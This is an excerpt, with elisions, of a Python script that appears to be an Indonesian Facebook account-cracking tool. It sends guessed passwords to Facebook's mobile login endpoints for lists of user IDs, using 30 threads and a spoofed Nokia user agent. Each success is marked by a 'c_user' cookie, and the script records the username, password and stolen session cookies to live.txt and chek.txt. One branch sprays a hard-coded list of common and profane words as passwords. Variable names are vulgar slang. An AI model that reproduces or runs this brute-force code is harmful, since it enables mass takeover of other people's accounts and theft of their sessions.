...
class ngentod:
							...
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										for pwas in xss:
											tokai.submit(self.login_mbasic,xi,pwas)
									except: pass
							hasil(live,chek)
						elif pilih in("3","03"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										for pwas in xss:
											tokai.submit(self.login_mfb,xi,pwas)
									except: pass
							hasil(live,chek)
						else:
	...
	def login_mbasic(self,user,pw):
		...
		for x in parser(kontol.text,"html.parser")("input"):
			if x.get("name") in list_data: data.update({x.get("name"):x.get("value")})
			else: continue
		...
		memek=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
	...
	def login_mfb(self,user,pw):
		...
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","user-agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","origin":"https://m.facebook.com","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		kontol=ses.get("https://m.facebook.com/login/?next&ref=dbl&refid=8")
		ses.headers.update({"cookie":";".join([f"{key}={value}" for key,value in kontol.cookies.get_dict().items()])})
		for x in parser(kontol.text,"html.parser")("input"):
			if x.get("value") is not None: data.update({x.get("name"):x.get("value")})
			else: data.update({x.get("name"):""})
		data.update({"email":user,"pass":pw,"prefill_contact_point":"","prefill_source":"","prefill_type":"","first_prefill_source":"","first_prefill_type":"","had_cp_prefilled":"false","had_password_prefilled":"false","is_smart_lock":"false","_fb_noscript":"true","bi_xrwh":"0"})
		memek=ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data)
		if "c_user" in memek.cookies:
			ok+=1
			kuki=";".join([f"{key}={value}" for key,value in memek.cookies.get_dict().items()])
			print(f"\r\x1b[1;32m * ---> {user}|{pw}|{kuki}\x1b[0m\n",end="")
				...
				for xa in self.id:
					try:
						...
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							...
							pewe=["Sayang","Kontol","Bangsat","Anjing"]
						for pwas in pewe:
							tokai.submit(self.login_mfb,xi[0],pwas)
					except:pass
			hasil(live,chek)
		else:
